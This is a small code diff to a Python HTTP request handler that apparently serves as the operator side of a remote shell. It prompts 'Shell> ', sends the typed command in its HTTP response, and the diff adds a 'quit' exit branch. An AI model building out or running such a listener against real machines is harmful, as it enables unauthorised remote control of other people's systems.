@@ -39,6 +39,8 @@ class MyHandler(BaseHTTPRequestHandler):
          return   
        else: 
         command = input("Shell> ")
+        if command == 'quit':
+         os._exit(0)    
         self.send_response(HTTP_STATUS_OK)
         self.send_header("Content-type", "text/html")
         self.end_headers()
